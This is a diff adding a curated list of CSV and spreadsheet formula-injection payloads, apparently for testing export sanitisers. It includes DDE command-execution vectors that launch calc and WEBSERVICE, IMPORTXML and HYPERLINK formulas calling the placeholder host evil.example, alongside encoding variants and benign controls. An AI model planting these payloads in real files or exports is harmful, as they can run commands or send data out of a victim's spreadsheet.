@@ -1,0 +1,30 @@
+# payload-list-version: 1.0.0
+# CSV / spreadsheet formula injection (Session 16, doc 07 section 4.7). Hand-curated; one vector per line;
+# `json:` lines hold a JSON string literal; `#` lines are comments.
+# count: 26
+=1+1
+=cmd|' /C calc'!A0
+=HYPERLINK("http://evil.example","Click")
+=IMPORTXML("http://evil.example","//a")
+=WEBSERVICE("http://evil.example")
++1+1
++cmd|' /C calc'!A0
+-1+1
+-2+3+cmd|' /C calc'!A0
+@SUM(1+1)*cmd|' /C calc'!A0
+@IMPORTRANGE("x","A1")
+json:"\t=1+1"
+json:"\r=1+1"
+json:"\n=1+1"
+ =1+1
+=1+1;=2+2
+=DDE("cmd";"/C calc";"__DdeLink_60_870516294")
+=SUM(A1:A2)
+=IF(1=1,"yes","no")
+=CONCATENATE("a","b")
+%0A=1+1
+'=1+1
+"=1+1"
+=""&1
+=1/0
+＝1+1
